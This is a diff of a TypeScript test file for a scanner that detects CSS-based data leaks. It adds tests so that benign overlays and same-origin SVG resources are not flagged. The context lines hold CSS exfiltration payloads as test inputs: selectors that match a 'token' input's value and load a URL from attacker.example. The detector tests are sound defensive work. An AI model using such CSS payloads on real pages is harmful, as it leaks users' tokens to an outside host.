@@ -3,6 +3,7 @@ import { readFileSync, readdirSync } from "node:fs";
 import { join } from "node:path";
 import { analyzeStylesheet } from "../../src/core/analyzer/analyzeStylesheet";
 import { scanDocument } from "../../src/browser/scanner/scanDocument";
+import { scanHtmlResourceAttributes } from "../../src/browser/scanner/htmlResourceScan";
 
 const pageUrl = "https://app.example.test/";
 function hasFinding(css: string): boolean { return analyzeStylesheet({ cssText: css, pageUrl, sourceKind: "style_element", sourceUrl: pageUrl }).findings.some((finding) => finding.severity !== "info"); }
@@ -18,6 +19,13 @@ describe("SPEC and CVE_SPEC acceptance criteria", () => {
     expect(hasFinding('@supports(display:grid){@media screen{input[value^="x"]{background:url(https://attacker.example/x)}}}')).toBe(true);
     expect(hasFinding('form:has(input[name="token"][value^="x"]){background:url(https://attacker.example/x)}')).toBe(true);
     expect(hasFinding('svg:has(input[name="token"]){fill:url(https://attacker.example/paint.svg#x)}')).toBe(true);
+    expect(hasFinding('.message-content .overlay{position:fixed !important;inset:0}')).toBe(false);
+  });
+
+  it("does not treat same-origin decorative HTML/SVG resources as actionable leaks", () => {
+    const documentRef = new DOMParser().parseFromString('<body background="/theme.png"><svg><filter><feImage href="/shadow.png"></feImage></filter><animate attributeName="fill" values="url(/icon.svg#paint)"></animate></svg></body>', "text/html");
+    const summary = scanHtmlResourceAttributes({ documentRef, pageUrl, frameUrl: pageUrl });
+    expect(summary.findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
   });
 
   it("reports cross-origin frames as partial coverage", () => {
